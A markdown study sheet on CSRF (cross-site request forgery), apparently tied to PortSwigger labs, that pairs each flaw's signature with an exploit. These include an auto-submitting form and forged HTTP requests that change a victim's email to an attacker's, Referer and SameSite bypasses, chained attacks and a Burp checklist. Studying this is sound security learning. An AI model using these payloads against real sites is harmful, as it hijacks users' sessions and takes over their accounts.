# ⚔️ CSRF (Cross-Site Request Forgery) — Exploit Notes

## 📌 Core Idea
CSRF forces a victim’s browser to perform unwanted actions using their authenticated session.

> Server trusts browser → browser auto-sends cookies → attacker abuses this trust.

---

# 🧪 PortSwigger Lab Mapping (Pattern Recognition)

## 🔹 1. No CSRF Protection
**Lab:** CSRF vulnerability with no defenses  

### Signature
- No CSRF token
- Only session cookie used

### Exploit
```html
<form action="https://victim.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  document.forms[0].submit();
</script>
````

---

## 🔹 2. Token Validation Depends on Presence

**Lab:** CSRF where token validation depends on presence

### Signature

* Token exists in request
* Removing parameter → still works

### Exploit

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123

email=attacker@evil.com
```

### Root Cause

```text
if (token exists) → validate
else → allow ❌
```

---

## 🔹 3. Method-Based Validation

**Lab:** CSRF where token validation depends on request method

### Signature

* POST requires token
* GET does not

### Exploit

```http
GET /email/change?email=attacker@evil.com HTTP/1.1
Cookie: session=abc123
```

---

## 🔹 4. Token Not Bound to Session

**Lab:** CSRF where token is not tied to user session

### Signature

* Token reusable across users

### Exploit

```http
POST /change-email
Cookie: victim_session

email=attacker@evil.com&csrf=ATTACKER_TOKEN
```

---

## 🔹 5. Token Duplicated in Cookie (Double Submit Flaw)

**Lab:** CSRF where token is duplicated in cookie

### Signature

* Same token in cookie + request

### Exploit

* Modify both values → bypass

---

## 🔹 6. SameSite Lax Bypass

**Lab:** CSRF with SameSite Lax bypass

### Signature

* Cookie uses `SameSite=Lax`

### Exploit

```html
<a href="https://victim.com/change-email?email=attacker@evil.com">
```

---

## 🔹 7. Referer Validation Broken

**Lab:** CSRF with flawed Referer validation

### Signature

* Server checks Referer but weakly

### Exploit

```http
Referer: https://attacker.com?victim.com
```

---

# ⚔️ Advanced CSRF Bypass Chains

## 🔥 1. CSRF + XSS

### Scenario

* CSRF protection exists
* XSS vulnerability present

### Exploit

* Use XSS to:

  * Extract CSRF token
  * Send forged request

### Impact

Full bypass of CSRF defenses

---

## 🔥 2. CSRF + SameSite Lax

### Scenario

* Cookies set to `SameSite=Lax`

### Exploit

* Trigger GET request via navigation

### Impact

Works when victim clicks link

---

## 🔥 3. CSRF + Subdomain Takeover

### Scenario

* App trusts `*.victim.com`

### Exploit

* Host attack on controlled subdomain
* Send valid-origin requests

### Impact

Bypass origin validation

---

## 🔥 4. CSRF + CORS Misconfiguration

### Scenario

* Server allows attacker origin in CORS

### Exploit

* Send authenticated requests via JS

### Impact

Full API interaction (not blind)

---

## 🔥 5. CSRF + Clickjacking

### Scenario

* No CSRF protection
* No X-Frame-Options

### Exploit

* Trick user into clicking hidden UI

### Impact

Higher success rate than blind CSRF

---

## 🔥 6. CSRF + Weak Referer Check

### Scenario

* Server checks substring match

### Exploit

```http
Referer: https://attacker.com?victim.com
```

### Impact

Bypass validation

---

# 🧠 Testing Checklist (Use in Burp)

* [ ] Remove CSRF token → still works?
* [ ] Change POST → GET?
* [ ] Reuse token across sessions?
* [ ] Token tied to cookie?
* [ ] Token predictable?
* [ ] Referer/Origin validation weak?

---

# ⚠️ Reality Check

* Basic CSRF → low value
* CSRF bypass → medium/high
* CSRF chained with other bugs → critical

---

# 🧠 Mental Model

> Find where CSRF defense is optional, inconsistent, or misconfigured — then chain it.

